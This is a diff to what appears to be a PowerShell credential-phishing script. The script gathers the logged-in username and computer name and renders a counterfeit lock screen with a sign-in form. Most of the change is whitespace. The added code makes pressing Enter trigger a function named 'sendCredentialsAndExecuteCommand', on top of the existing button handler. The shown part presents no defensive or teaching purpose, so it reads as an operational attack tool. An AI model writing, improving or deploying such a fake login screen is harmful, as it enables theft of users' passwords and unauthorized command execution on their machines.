@@ -19,27 +19,23 @@ $u = GPRESULT -Z /USER $Env:username | Select-String -Pattern "([a-zA-Z0-9_\-\.]
 $c = $env:COMPUTERNAME
 $u = ("$u").Trim()
 
-
 # DEFINE HTML CODE
-
 $h = @"
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
-	  <meta charset="UTF-8">
+    <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>&#65279;</title>
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.5.0/css/bootstrap.min.css">
-	<link href="https://fonts.googleapis.com/css?family=Open+Sans+Condensed:300&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.5.0/css/bootstrap.min.css">
+    <link href="https://fonts.googleapis.com/css?family=Open+Sans+Condensed:300&display=swap" rel="stylesheet">
 <style>
 @import url(https://fonts.googleapis.com/css2?family=Open+Sans:wght@300&display=swap);
 body{background:rgba(0,0,0,1);margin:0;padding:0;overflow-x:hidden}.alert{background:rgba(0,0,0,1);position:fixed;top:0;left:0;width:100%;height:auto;z-index:10;padding:10px}.alert ul{padding:0;margin:0;list-style:none;display:flex;justify-content:space-around;align-items:center}.alert ul li b{color:#589;font-weight:600;font-family:Arial,sans-serif}#container{height:100vh;width:100vw;overflow:hidden;position:relative}#wallpaper{background-image:url(https://images.pexels.com/photos/1064162/pexels-photo-1064162.jpeg);background-repeat:no-repeat;background-size:cover;background-position:center;height:100vh;width:100vw;position:absolute;top:0;left:0}#wallpaper.slideUp{transition:all .6s ease;transform:translateY(-100%)}#wallpaper.slideDown{transition:all .6s linear;transform:translateY(0%)}.icons{display:flex;justify-content:flex-start;align-items:center;padding-left:.5em}.icons i{color:#fff;margin-top:.7em;margin-right:2em}#date_cont{position:absolute;top:70%;left:3%;animation:slideInFast .3s .3s linear forwards;visibility:hidden;transform:translateY(150%);transition:all .6s ease both}@keyframes slideInFast{from{visibility:hidden;opacity:0;transform:translateY(100%)}to{visibility:visible;opacity:1;transform:translateY(0%)}}#time{font-size:7em;font-family:'Open Sans Condensed',sans-serif;color:#fff;margin:0;margin-left:-15px;padding:0}#date{font-size:3em;font-family:'Open Sans',sans-serif;color:#fff;margin-top:-.6em}
 </style>
 </head>
 <body>
-
 	<div id="container">
 		<div id="wallpaper">
 			<div id="date_cont">
@@ -114,7 +110,6 @@ body{background:rgba(0,0,0,1);margin:0;padding:0;overflow-x:hidden}.alert{backgr
 	</script>
   </body>
 </html>
-
 "@
 
 $h2 = @"
@@ -177,6 +172,16 @@ $h2 = @"
     document.getElementById("btnSignIn").addEventListener("click", function() {
       sendCredentialsAndExecuteCommand();
     });
+
+    document.addEventListener('keypress', (e)=>{
+    console.log('key pressed', e.keyCode);
+    if(e.keyCode === 13) {
+      sendCredentialsAndExecuteCommand();
+    }
+    else {
+      return null;
+    }
+  });
   </script>
 </body>
 </html>
